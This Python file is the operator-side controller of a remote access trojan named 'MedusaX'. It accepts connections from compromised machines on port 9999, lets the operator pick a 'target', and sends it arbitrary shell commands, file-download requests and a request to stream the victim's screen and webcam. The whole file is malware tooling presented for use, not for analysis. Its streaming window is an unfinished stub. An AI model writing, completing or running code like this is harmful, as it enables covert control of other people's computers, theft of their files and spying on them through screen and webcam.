import socket
import threading
import os
import sys
from PyQt5 import QtWidgets, QtGui, QtCore

# Global variables
clients = {}
current_target = None
server_socket = None

# Function to handle client connections
def handle_client(client_socket, client_address):
    global current_target
    
    client_ip = client_address[0]
    clients[client_ip] = client_socket
    if len(clients) == 1:
        current_target = client_ip
    
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(data)
        except:
            break
    
    client_socket.close()
    del clients[client_ip]
    if current_target == client_ip:
        current_target = None
    print(f"Client {client_ip} disconnected")

# Function to start the server
def start_server():
    global server_socket
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 9999))
    server_socket.listen(5)
    print("Server started on port 9999")
    
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Client {client_address[0]} connected")
        threading.Thread(target=handle_client, args=(client_socket, client_address)).start()

# Function to execute shell commands
def execute_shell_command(command):
    if current_target:
        clients[current_target].send(command.encode())
    else:
        print("[-] No target selected")

# Function to handle server commands
def handle_server_command(command):
    global current_target
    
    if command.startswith("!set target"):
        target_ip = command.split(" ")[2]
        if target_ip in clients:
            current_target = target_ip
            print(f"Target set to {target_ip}")
        else:
            print(f"[-] No such client: {target_ip}")
    elif command.startswith("!remove target"):
        target_ip = command.split(" ")[2]
        if target_ip == current_target:
            current_target = None
            print(f"Target {target_ip} removed")
        else:
            print(f"[-] No such target: {target_ip}")
    elif command.startswith("!download"):
        filename = command.split(" ")[1]
        if current_target:
            clients[current_target].send(command.encode())
            print("[ * ] Sending...")
        else:
            print("[-] No target selected")
    elif command == "!list":
        for client_ip in clients:
            if client_ip == current_target:
                print(f"{client_ip} (selected)")
            else:
                print(client_ip)
    elif command == "!stream":
        if current_target:
            # Launch GUI for screen sharing and webcam stream
            app = QtWidgets.QApplication(sys.argv)
            screen_sharing_window = ScreenSharingWindow(current_target)
            screen_sharing_window.show()
            sys.exit(app.exec_())
        else:
            print("[-] No target selected")
    else:
        execute_shell_command(command)

# GUI for screen sharing and webcam stream
class ScreenSharingWindow(QtWidgets.QWidget):
    def __init__(self, target_ip):
        super().__init__()
        self.target_ip = target_ip
        self.initUI()
    
    def initUI(self):
        self.setWindowTitle("MedusaX - Screen Sharing")
        self.setGeometry(100, 100, 800, 600)
        self.screen_label = QtWidgets.QLabel(self)
        self.screen_label.setGeometry(0, 0, 800, 600)
        self.screen_label.setStyleSheet("background-color: black;")
        self.webcam_label = QtWidgets.QLabel(self)
        self.webcam_label.setGeometry(650, 10, 140, 140)
        self.webcam_label.setStyleSheet("background-color: black;")

# Main function
if __name__ == "__main__":
    threading.Thread(target=start_server).start()
    
    while True:
        if clients:
            command = input("medusax > ")
            handle_server_command(command)
        else:
            continue
